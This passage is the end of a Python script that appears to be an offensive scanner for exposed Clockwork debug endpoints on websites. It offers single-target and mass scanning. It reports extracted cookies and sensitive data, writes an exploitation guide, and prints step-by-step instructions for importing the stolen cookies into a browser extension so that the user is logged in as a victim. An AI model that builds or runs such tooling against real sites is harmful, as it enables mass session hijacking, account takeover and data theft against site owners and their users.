                safe_print(f"{Y}  4.{RST} Install Cookie Editor browser extension")
                safe_print(f"{Y}  5.{RST} Import cookies and visit the site")
                safe_print(f"{Y}  6.{RST} Check EXPLOITATION_GUIDE.txt for details\n")
        else:
            safe_print(f"{G}[+]{RST} No vulnerabilities found\n")
        
        return all_exposures

# ==================== MENU ====================
def show_menu():
    """Display main menu"""
    print(BANNER)
    print(f"{G}[1]{RST} Scan single target")
    print(f"{G}[2]{RST} Mass scan from file")
    print(f"{R}[0]{RST} Exit\n")

def main():
    """Main function"""
    global THREADS
    
    while True:
        show_menu()
        
        choice = input(f"{C}[?]{RST} Select option: ").strip()
        
        if choice == '0':
            safe_print(f"\n{Y}[*]{RST} Exiting...\n")
            break
        
        if choice not in ['1', '2']:
            safe_print(f"{R}[!]{RST} Invalid option\n")
            continue
        
        scanner = ClockworkScanner()
        
        if choice == '1':
            # Single target scan
            target = input(f"{C}[?]{RST} Target URL/domain: ").strip()
            
            if not target:
                safe_print(f"{R}[!]{RST} Target required\n")
                continue
            
            target = normalize_url(target)
            hostname = get_hostname(target)
            
            safe_print(f"\n{C}[*]{RST} Starting scan...")
            exposures = scanner.scan_target(target)
            
            if exposures:
                safe_print(f"\n{G}[+]{RST} Found {len(exposures)} Clockwork exposures!")
                safe_print(f"{G}[+]{RST} Results saved to: Results/{hostname}/\n")
                
                safe_print(f"{Y}[EXPOSED ENDPOINTS]{RST}")
                for i, exp in enumerate(exposures, 1):
                    safe_print(f"{G}  [{i}]{RST} {exp['url']}")
                    safe_print(f"      Status: {exp['status']} | Size: {exp['size']} bytes")
                    if exp['sensitive_data']:
                        safe_print(f"      Sensitive: {', '.join(exp['sensitive_data'][:3])}")
                    if exp.get('cookies'):
                        safe_print(f"      Cookies: {len(exp['cookies'])} extracted")
                    if exp.get('latest_url'):
                        safe_print(f"      Latest: {exp['latest_url']}")
                    if exp.get('request_ids'):
                        safe_print(f"      Request IDs: {len(exp['request_ids'])} found")
                    safe_print(f"      Exploitable: {G if exp['exploitable'] else R}{'YES' if exp['exploitable'] else 'NO'}{RST}")
                
                safe_print(f"\n{M}[FILES CREATED]{RST}")
                safe_print(f"{M}  [+]{RST} exposed_urls.txt - List of exposed endpoints")
                safe_print(f"{M}  [+]{RST} cookies_cookie-editor.json - Import to Cookie Editor")
                safe_print(f"{M}  [+]{RST} cookies.txt - Readable cookie format")
                safe_print(f"{M}  [+]{RST} EXPLOITATION_GUIDE.txt - Step by step guide")
                safe_print(f"{M}  [+]{RST} response_*.txt - Raw response samples")
                
                safe_print(f"\n{Y}[QUICK START]{RST}")
                safe_print(f"{Y}  1.{RST} Open: Results/{hostname}/cookies_cookie-editor.json")
                safe_print(f"{Y}  2.{RST} Copy the JSON content")
                safe_print(f"{Y}  3.{RST} Install Cookie Editor extension")
                safe_print(f"{Y}  4.{RST} Click Import and paste JSON")
                safe_print(f"{Y}  5.{RST} Visit {hostname} - you should be logged in\n")
            else:
                safe_print(f"\n{G}[+]{RST} No Clockwork exposures found")
                safe_print(f"{G}[+]{RST} Target appears secure\n")
        
        elif choice == '2':
            # Mass scan from file
            target_file = input(f"{C}[?]{RST} Target list file path: ").strip()
            
            if not os.path.exists(target_file):
                safe_print(f"{R}[!]{RST} File not found: {target_file}\n")
                continue
            
            # Get threads
            thread_input = input(f"{C}[?]{RST} Threads (default {THREADS}): ").strip()
            if thread_input:
                try:
                    THREADS = int(thread_input)
                except:
                    safe_print(f"{R}[!]{RST} Invalid thread count, using {THREADS}\n")
            
            # Read targets
            targets = read_targets(target_file)
            if not targets:
                safe_print(f"{R}[!]{RST} No valid targets found\n")
                continue
            
            safe_print(f"{G}[+]{RST} Loaded {len(targets)} targets\n")
            
            # Scan
            scanner.scan_multiple_targets(targets)
        
        input(f"\n{Y}Press Enter to continue...{RST}")
        print("\n" * 2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        safe_print(f"\n\n{Y}[!]{RST} Interrupted by user\n")
        sys.exit(0)
    except Exception as e:
        safe_print(f"\n{R}[ERROR]{RST} {e}\n")
        sys.exit(1)
